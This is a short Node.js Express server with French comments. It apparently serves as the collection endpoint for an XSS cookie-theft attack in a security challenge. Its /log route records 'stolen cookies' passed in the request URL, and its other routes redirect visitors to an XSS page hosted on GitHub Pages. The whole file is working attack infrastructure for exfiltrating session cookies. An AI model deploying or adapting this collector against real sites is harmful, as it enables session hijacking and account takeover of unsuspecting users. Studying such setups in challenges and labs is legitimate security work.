const express = require('express');
const app = express();

// Route pour logger les cookies volés
app.get('/log', (req, res) => {
  console.log('[+] Cookie volé:', req.url);
  res.send('Cookie reçu, merci !');
});

// Redirection vers ta page XSS hébergée sur GitHub Pages
app.get('/', (req, res) => {
  res.redirect('https://aketo.github.io/xss-front/xss.html'); // ← adapte à ton vrai repo si différent
});

// Route alternative au cas où tu veux soumettre cette URL au challenge
app.get('/xss', (req, res) => {
  res.redirect('https://aketo.github.io/xss-front/xss.html'); // ← idem
});

// Lancement du serveur
app.listen(5000, '0.0.0.0', () => {
  console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
});
